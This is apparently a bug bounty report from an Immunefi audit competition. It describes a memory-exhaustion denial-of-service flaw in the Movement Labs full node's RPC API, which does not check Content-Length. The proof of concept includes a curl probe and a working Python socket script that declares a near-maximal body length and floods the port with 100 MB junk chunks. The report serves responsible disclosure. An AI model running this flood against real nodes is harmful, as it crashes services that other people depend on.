# #42102 \[BC-High] uncontrolled resource consumption is resulting in OOM via RPC (public one)

**Submitted on Mar 20th 2025 at 20:04:06 UTC by @fnmain for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #42102
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/networks/movement/movement-full-node>
* **Impacts:**
  * RPC API crash affecting programs with greater than or equal to 25% of the market capitalization on top of the respective layer

## Description

## Brief/Intro

the API server do not check for size limits or stored data which means an attacker can just loop sending operation until it fills up the whole memory , note: the max size is capped at uint64\_t max

## Vulnerability Details

at the public RPC port the server do not validate the content length size which can lead to DoS (crash due OOM) since the attacker will need just to submit a request with a huge size and then looping a send with junk data until it consume all node memory .

## Impact Details

oom , crash

## References

Add any relevant links to documentation or code

## Proof of Concept

## Proof of Concept

as first step to verify the existence of the weakness you can execute `curl 127.0.0.1:30731/v1/transactions -XPOST -H "Content-type: application/json" -H "Content-length: 1024102410241024" -v; echo` you will see that the server is waiting for data even if the content length is non logical

### python script to exploit it :

```
import socket
#curl 127.0.0.1:30731/v1/transactions -XPOST -H "Content-type: application/json" -H "Content-length: 1024102410241024" -v; echo

s=socket.socket()
s.connect(("127.0.0.1", 30731))

headers = [
    "POST /v1/transactions HTTP/1.1",
    "Host: 127.0.0.1:30731",
    "User-Agent: dv1.0",
    "Accept: */*",
    "Content-Type: application/json",
    "Content-Length: 18446744073709551613",
]

headers = "\r\n".join(headers)
req = f"{headers}\r\n\r\n"

s.send(req.encode())


#__import__("time").sleep(5)
ovbuf = "A"*1024*1024*100
try:
    while True:
        s.send(ovbuf.encode())
except:
    print(s.recv(0x1024))
```
